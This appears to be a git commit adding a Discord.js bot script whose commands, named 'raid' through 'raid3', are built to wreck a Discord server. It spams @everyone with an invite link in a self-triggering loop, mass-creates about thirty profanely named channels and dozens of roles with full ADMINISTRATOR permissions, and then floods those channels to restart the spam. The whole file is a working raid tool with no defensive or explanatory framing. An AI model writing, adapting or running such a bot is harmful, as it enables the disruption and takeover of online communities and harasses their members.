5e7846e86a2ee53c3123d48c9f194aa1a0416fe2
oXoTrio <46646457+oXoTrio@users.noreply.github.com>
2019-04-26 06:22:20 -0500

    Create index.js

---
+++ index.js
@@ -0,0 +1,364 @@
+const Discord = require('discord.js');
+const client = new Discord.Client();
+
+client.on('message', message => {
+
+  let msg = message.content.toLowerCase();
+  
+  
+  if (msg === `raid`) {
+    message.channel.send(`@everyone https://discord.gg/zWA8uZC`)
+  }
+  if (msg === `@everyone https://discord.gg/zWA8uZC`) {
+    message.channel.send(`@everyone https://discord.gg/zWA8uZC`)
+  }
+  if (msg === `raid1`) {
+    message.delete()
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+    message.guild.createChannel('fuck', 'text')
+  }
+  if (msg === `raid2`) {
+    message.delete()
+        message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+          message.guild.createRole({
+            name: 'FUCK',
+            permissions: ["ADMINISTRATOR"],
+          })
+  }
+  if (msg === `raid3`) {
+    message.delete()
+     client.channels.filter(ch => ch.name === 'fuck' && ch.type === 'text').forEach(channel => {
+            channel.send(`raid`)
+    })
+  }
+});
+
+client.login(process.env.BOT_TOKEN);
